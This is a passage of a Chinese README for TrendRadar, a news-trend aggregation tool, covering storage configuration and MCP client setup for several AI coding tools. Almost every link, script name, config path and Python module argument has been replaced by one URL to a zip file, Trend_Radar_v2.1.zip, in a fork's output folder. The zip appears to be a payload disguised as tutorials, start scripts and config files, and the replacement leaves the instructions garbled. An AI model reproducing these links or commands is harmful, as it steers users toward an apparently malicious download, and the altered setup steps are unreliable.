  local:
    data_dir: "output"    # 本地存储目录
    retention_days: 0     # 本地数据保留天数，0表示永久保留

  remote:
    endpoint_url: ""      # S3 API 端点
    bucket_name: ""       # 存储桶名称
    access_key_id: ""     # 访问密钥ID
    secret_access_key: "" # 访问密钥
    region: ""            # 区域（可选）
    retention_days: 0     # 远程数据保留天数，0表示永久保留

  pull:
    enabled: false        # 是否启用启动时从远程拉取数据
    days: 7               # 拉取最近N天的数据
```

#### 后端选择策略

| backend 值 | 说明 | 适用场景 |
|-----------|------|---------|
| `auto` | **自动选择**（推荐） | 根据运行环境智能选择：<br>• GitHub Actions → Remote<br>• Docker/本地 → Local |
| `local` | 本地 SQLite 数据库 | Docker 部署、本地开发 |
| `remote` | 远程云存储（S3 兼容，如 Cloudflare R2） | GitHub Actions、多机器同步 |


#### 远程云存储配置

**环境变量**（推荐方式）：

```bash
# GitHub Actions / Docker 环境变量
STORAGE_BACKEND=remote  # 或 auto

# 本地/远程数据保留天数（0 表示永久保留）
LOCAL_RETENTION_DAYS=0
REMOTE_RETENTION_DAYS=0

# S3 兼容存储配置（以 Cloudflare R2 为例）
S3_BUCKET_NAME=your-bucket-name
S3_ACCESS_KEY_ID=your-access-key-id
S3_SECRET_ACCESS_KEY=your-secret-access-key
S3_ENDPOINT_URL=https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
S3_REGION=auto

# 数据拉取配置（可选，从远程同步到本地）
PULL_ENABLED=false
PULL_DAYS=7
```

**获取凭据**：参见 [快速开始 - 远程存储配置](#-快速开始)

#### 数据清理策略

**自动清理**：每次运行结束时检查并删除超过保留天数的数据。

```yaml
storage:
  local:
    retention_days: 30  # 本地保留最近30天数据
  remote:
    retention_days: 30  # 远程保留最近30天数据
```

**清理逻辑**：
- 本地存储：删除过期日期的文件夹（如 `output/2025-11-10/`）
- 远程存储：批量删除过期的云端对象（如 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`）

#### 时区配置（v4.0.0 新增）

**全球时区支持**：解决非中国用户推送时间窗口问题。

```yaml
app:
  timezone: "Asia/Shanghai"  # 默认中国时区
  # 其他示例：
  # timezone: "America/Los_Angeles"  # 美西时间
  # timezone: "Europe/London"        # 英国时间
```

**支持所有 IANA 时区名称**：[时区列表](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)


#### 不兼容变更

⚠️ **v4.0.0 不兼容 v3.x 数据**：

1. 数据库结构完全重构，无法读取旧数据
2. 文件路径格式变更（ISO 格式）

**迁移建议**：
- 从 v4.0.0 开始重新收集数据
- 旧数据如需保留，请手动重命名目录格式（不推荐）

</details>

<br>

## 🤖 AI 智能分析

TrendRadar v3.0.0 新增了基于 **MCP (Model Context Protocol)** 的 AI 分析功能，让你可以通过自然语言与新闻数据对话，进行深度分析。


### ⚠️ 使用前必读


**重要提示：AI 功能需要本地新闻数据支持**

AI 分析功能**不是**直接查询网络实时数据，而是分析你**本地已积累的新闻数据**（存储在 `output` 文件夹中）


#### 使用说明：

1. **项目自带测试数据**：`output` 目录默认包含 **2025-11-01～2025-11-15** 的新闻数据，可用于快速体验 AI 功能

2. **查询限制**：
   - ✅ 只能查询已有日期范围内的数据（11月1-15日）
   - ❌ 无法查询实时新闻或未来日期

3. **获取最新数据**：
   - 测试数据仅供快速体验，**建议自行部署项目**获取实时数据
   - 按照 [快速开始](#-快速开始) 部署运行项目
   - 等待至少 1 天积累新闻数据后，即可查询最新热点


### 1. 快速部署

Cherry Studio 提供 GUI 配置界面，5 分钟快速部署，复杂的部分是一键安装的。

**图文部署教程**：现已更新到我的[公众号](#问题答疑与交流)，回复 "mcp" 即可

**详细部署教程**：[https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

**部署模式说明**：
- **STDIO 模式（推荐）**：一次配置后续无需重复配置，**图文部署教程**中仅以此模式的配置为例。
- **HTTP 模式（备选）**：如果 STDIO 模式配置遇到问题，可使用 HTTP 模式。此模式的配置方式与 STDIO 基本一致，但复制粘贴的内容就一行，不易出错。唯一需要注意的是每次使用前都需要手动启动一下服务。详细请参考 [https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 底部的 HTTP 模式说明。

### 2. 学习与 AI 对话的姿势

**详细对话教程**：[https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

<details>
<summary>👉 点击展开：<strong>查看 AI 对话示例图</strong></summary>
<br>

> 💡 **提示**：实际不建议一次性问多个问题。如果你选择的 AI 模型连下图的按顺序调用都无法做到，建议换一个。


</details>

<br>

## 🔌 MCP 客户端

TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可以接入各种支持 MCP 的 AI 客户端进行智能分析。

### 支持的客户端

**注意事项**：
- 将 `/path/to/TrendRadar` 替换为你的项目实际路径
- Windows 路径使用双反斜杠：`C:\\Users\\YourName\\TrendRadar`
- 保存后记得重启

<details>
<summary>👉 点击展开：<b>Claude Desktop</b></summary>

#### 配置文件方式

编辑 Claude Desktop 的 MCP 配置文件：

**Windows**：
`%APPDATA%\Claude\https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

**Mac**：
`~/Library/Application https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

**配置内容**：
```json
{
  "mcpServers": {
    "trendradar": {
      "command": "uv",
      "args": [
        "--directory",
        "/path/to/TrendRadar",
        "run",
        "python",
        "-m",
        "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
      ],
      "env": {},
      "disabled": false,
      "alwaysAllow": []
    }
  }
}
```

</details>

<details>
<summary>👉 点击展开：<b>Cursor</b></summary>

#### 方式一：HTTP 模式

1. **启动 HTTP 服务**：
   ```bash
   # Windows
   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   
   # Mac/Linux
   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   ```

2. **配置 Cursor**：

   **项目级配置**（推荐）：
   在项目根目录创建 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
   ```json
   {
     "mcpServers": {
       "trendradar": {
         "url": "http://localhost:3333/mcp",
         "description": "TrendRadar 新闻热点聚合分析"
       }
     }
   }
   ```

   **全局配置**：
   在用户目录创建 `~https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（同样内容）

3. **使用步骤**：
   - 保存配置文件后重启 Cursor
   - 在聊天界面的 "Available Tools" 中查看已连接的工具
   - 开始使用：`搜索今天的"AI"相关新闻`

#### 方式二：STDIO 模式（推荐）

创建 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
```json
{
  "mcpServers": {
    "trendradar": {
      "command": "uv",
      "args": [
        "--directory",
        "/path/to/TrendRadar",
        "run",
        "python",
        "-m",
        "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
      ]
    }
  }
}
```

</details>

<details>
<summary>👉 点击展开：<b>VSCode (Cline/Continue)</b></summary>

#### Cline 配置

在 Cline 的 MCP 设置中添加：

**HTTP 模式**：
```json
{
  "trendradar": {
    "url": "http://localhost:3333/mcp",
    "type": "streamableHttp",
    "autoApprove": [],
    "disabled": false
  }
}
```

**STDIO 模式**（推荐）：
```json
{
  "trendradar": {
    "command": "uv",
    "args": [
      "--directory",
      "/path/to/TrendRadar",
      "run",
      "python",
      "-m",
      "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
    ],
    "type": "stdio",
    "disabled": false
  }
}
```

#### Continue 配置

编辑 `~https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
```json
{
  "experimental": {
    "modelContextProtocolServers": [
      {
        "transport": {
          "type": "stdio",
          "command": "uv",
          "args": [
            "--directory",
            "/path/to/TrendRadar",
            "run",
            "python",
            "-m",
            "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
          ]
        }
      }
    ]
  }
}
```

**使用示例**：
```
分析最近7天"特斯拉"的热度变化趋势
生成今天的热点摘要报告
搜索"比特币"相关新闻并分析情感倾向
```

</details>

<details>
<summary>👉 点击展开：<b>Claude Code CLI</b></summary>

#### HTTP 模式配置

```bash
# 1. 启动 HTTP 服务
# Windows: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
# Mac/Linux: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 2. 添加 MCP 服务器
claude mcp add --transport http trendradar http://localhost:3333/mcp

# 3. 验证连接（确保服务已启动）
claude mcp list
```

#### 使用示例

```bash
# 查询新闻
claude "搜索今天知乎的热点新闻，前10条"

# 趋势分析
claude "分析'人工智能'这个话题最近一周的热度趋势"

# 数据对比
claude "对比知乎和微博平台对'比特币'的关注度"
```

</details>

<details>
<summary>👉 点击展开：<b>MCP Inspector</b>（调试工具）</summary>
<br>

MCP Inspector 是官方调试工具，用于测试 MCP 连接：

#### 使用步骤

1. **启动 TrendRadar HTTP 服务**：
   ```bash
   # Windows
   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   
   # Mac/Linux
   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   ```

2. **启动 MCP Inspector**：
   ```bash
   npx @modelcontextprotocol/inspector
   ```

3. **在浏览器中连接**：
   - 访问：`http://localhost:3333/mcp`
   - 测试 "Ping Server" 功能验证连接
   - 检查 "List Tools" 是否返回 13 个工具：
     - 基础查询：get_latest_news, get_news_by_date, get_trending_topics
     - 智能检索：search_news, search_related_news_history
     - 高级分析：analyze_topic_trend, analyze_data_insights, analyze_sentiment, find_similar_news, generate_summary_report
     - 系统管理：get_current_config, get_system_status, trigger_crawl

</details>

<details>
<summary>👉 点击展开：<b>其他支持 MCP 的客户端</b></summary>
<br>

任何支持 Model Context Protocol 的客户端都可以连接 TrendRadar：

#### HTTP 模式

**服务地址**：`http://localhost:3333/mcp`

**基本配置模板**：
```json
{
  "name": "trendradar",
  "url": "http://localhost:3333/mcp",
  "type": "http",
  "description": "新闻热点聚合分析"
}
```

#### STDIO 模式（推荐）

**基本配置模板**：
```json
{
  "name": "trendradar",
  "command": "uv",
  "args": [
    "--directory",
    "/path/to/TrendRadar",
    "run",
    "python",
    "-m",
    "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
  ],
  "type": "stdio"
}
```

**注意事项**：
- 替换 `/path/to/TrendRadar` 为实际项目路径
- Windows 路径使用反斜杠转义：`C:\\Users\\...`
- 确保已完成项目依赖安装（运行过 setup 脚本）

</details>


### 常见问题

<details>
<summary>👉 点击展开：<b>Q1: HTTP 服务无法启动？</b></summary>
<br>

**检查步骤**：
1. 确认端口 3333 未被占用：
   ```bash
   # Windows
   netstat -ano | findstr :3333
   
   # Mac/Linux
   lsof -i :3333
   ```

2. 检查项目依赖是否安装：
   ```bash
   # 重新运行安装脚本
   # Windows: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 或者 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   # Mac/Linux: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   ```

3. 查看详细错误日志：
   ```bash
   uv run python -m https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip --transport http --port 3333
   ```
4. 尝试自定义端口:
   ```bash
   uv run python -m https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip --transport http --port 33333
   ```

</details>

<details>
<summary>👉 点击展开：<b>Q2: 客户端无法连接到 MCP 服务？</b></summary>
<br>

**解决方案**：

1. **STDIO 模式**：
   - 确认 UV 路径正确（运行 `which uv` 或 `where uv`）
   - 确认项目路径正确且无中文字符
   - 查看客户端错误日志

2. **HTTP 模式**：
   - 确认服务已启动（访问 `http://localhost:3333/mcp`）
   - 检查防火墙设置
   - 尝试使用 127.0.0.1 替代 localhost

3. **通用检查**：
   - 重启客户端应用
   - 查看 MCP 服务日志
   - 使用 MCP Inspector 测试连接

</details>

<details>
<summary>👉 点击展开：<b>Q3: 工具调用失败或返回错误？</b></summary>
<br>

**可能原因**：

1. **数据不存在**：
   - 确认已运行过爬虫（有 output 目录数据）
   - 检查查询日期范围是否有数据
   - 查看 output 目录的可用日期

2. **参数错误**：
   - 检查日期格式：`YYYY-MM-DD`
   - 确认平台 ID 正确：`zhihu`, `weibo` 等
   - 查看工具文档中的参数说明

3. **配置问题**：
   - 确认 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 存在
   - 确认 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 存在
   - 检查配置文件格式是否正确

</details>

<br>

## ☕问题答疑与交流

> 如果你想支持本项目，可通过微信搜索**腾讯公益**，对里面的**助学**相关的项目随心捐助
>
> 感谢参与过**一元点赞**的朋友，已收录至顶部**致谢名单**！你们的支持让开源维护更有动力，个人打赏码现已移除。

- **GitHub Issues**：适合针对性强的解答。提问时请提供完整信息（截图、错误日志、系统环境等）。
- **公众号交流**：适合快速咨询。建议优先在相关文章下的公共留言区交流，如私信，请文明礼貌用语😉
- 💡 部署成功了？来公众号说说感受吧，你的点赞和留言都是我继续更新的动力~


<div align="center">

|公众号关注 |
|:---:|
|  |

</div>

<br>


## 🪄 赞助商

> 每天追踪这么多热点，写报告、回复消息是否让手腕疲惫？        
> 试试「闪电说」AI 语音输入法 —— 用说的，比打字快 4 倍 ⚡ 。从看热点到输出内容，让效率翻倍 👇

<div align="center">

[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) [](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank">
  
</a>
</div>


---

<br>

## 📚 项目相关

> **4 篇文章**：

- [可在该文章下方留言，方便项目作者用手机答疑](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
- [2个月破 1000 star，我的GitHub项目推广实战经验](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
- [github fork 运行本项目的注意事项 ](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
- [基于本项目，如何开展公众号或者新闻资讯类文章写作](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

>**AI 开发**：
- 如果你有小众需求，完全可以基于我的项目自行开发，零编程基础的也可以试试
- 我所有的开源项目或多或少都使用了自己写的**AI辅助软件**来提升开发效率，这款工具已开源
- **核心功能**：迅速筛选项目代码喂给AI，你只需要补充个人需求即可
- **项目地址**：https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

### 其余项目

> 📍 毛主席足迹地图 - 交互式动态展示1893-1976年完整轨迹。欢迎诸位同志贡献数据

- https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

> 哔哩哔哩(bilibili)评论区数据可视化分析软件

- https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip


### 本项目流程图

```mermaid
flowchart TD
    A[👤 用户开始] --> B{🚀 选择部署方式}
    
    B -->|云端部署| C1[🍴 Fork 项目到 GitHub]
    B -->|本地部署| C2[🐳 Docker 部署]
    
    C1 --> D[⚙️ 配置通知渠道<br/>可同时配置多个]
    C2 --> D
    
    D --> E[选择通知方式：<br/>📱企业微信 💬飞书 🔔钉钉<br/>📟Telegram 📧邮件]
    
    E --> F[🔑 填写通知参数<br/>GitHub Secrets 或环境变量]
    
    F --> G[📝 配置关键词<br/>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip<br/>普通词/必须词+/过滤词!]
    
    G --> H[🎯 选择运行模式<br/>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip]
    
    H --> H1[📋 daily - 当日汇总<br/>定时推送所有匹配新闻]
    H --> H2[📰 current - 当前榜单<br/>定时推送最新榜单]
    H --> H3[📈 incremental - 增量监控<br/>仅推送新增内容]
    
    H1 --> I[可选：推送时间窗口控制<br/>⏰ 限制推送时间范围]
    H2 --> I
    H3 --> I
    
    I --> J[✅ 配置完成]
    
    J --> K[🤖 系统自动运行]
    
    K --> L[🕷️ 爬取11+平台热点]
    L --> M[🔍 关键词筛选]
    M --> N[⚖️ 权重算法排序<br/>排名60% + 频次30% + 热度10%]
    N --> O[📊 生成报告<br/>HTML网页 + 推送消息]
    O --> P[📱 多渠道推送通知]
    
    P --> Q[🎉 持续接收精准推送<br/>告别信息过载]
    
    style A fill:#e3f2fd
    style B fill:#f3e5f5
    style D fill:#fff3e0
    style F fill:#fff9c4
    style G fill:#e8f5e9
    style H fill:#e0f2f1
    style I fill:#fce4ec
    style O fill:#e1bee7
    style Q fill:#c8e6c9
```



[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

<br>

## 📄 许可证

GPL-3.0 License

---

<div align="center">

[🔝 回到顶部](#trendradar)

</div>